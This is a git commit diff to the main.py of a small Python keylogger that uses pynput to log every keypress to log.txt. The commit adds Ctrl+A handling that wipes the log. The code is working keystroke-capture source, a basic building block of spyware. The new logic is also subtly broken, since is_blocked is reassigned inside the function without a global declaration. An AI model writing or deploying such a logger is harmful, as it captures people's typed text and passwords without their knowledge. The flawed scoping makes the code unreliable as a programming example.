4a08130465ea082206d2725d818a9720cc90fb77
Alfdzrii <Alfadzri.Abhipraya@gmail.com>
2025-12-31 12:48:23 +0700

    adding ctrl+a configuration

--- main.py
+++ main.py
@@ -1,5 +1,7 @@
 from pynput.keyboard import Listener, Key
 
+is_blocked = False
+
 def writetofile(key):
     letter = str(key)
     # key replace
@@ -7,10 +9,24 @@ def writetofile(key):
     letter = letter.replace("Key.enter","\n")
     letter = letter.replace("Key.space"," ")
     letter = letter.replace("Key.tab","\t")
-    letter = letter.replace("Key.ctrl", "")
+    # letter = letter.replace("Key.ctrl", "")
     letter = letter.replace("Key.ctrls ","")
     letter = letter.replace("Key.alt","")
     letter = letter.replace("Key.shift ","")
+
+    # ctrl+a logic
+    if letter == "Key.ctrla":
+        is_blocked = True
+        print (" (user blocked all characters) ")
+        return
+
+    if is_blocked:
+        with open("log.txt", "w") as file:
+            file.write("")
+        is_blocked = False
+        if letter == "Key.backspace":
+            letter = ""
+        return
     # backspace logic
     if letter == "Key.backspace":
         try:
@@ -23,9 +39,17 @@ def writetofile(key):
             pass
         letter = ""
 
+
     # creating the file for the keystroke
     with open("log.txt","a") as file:
         file.write(letter)
 
 with Listener(on_press = writetofile) as l:
     l.join()
+
+
+
+
+
+
+
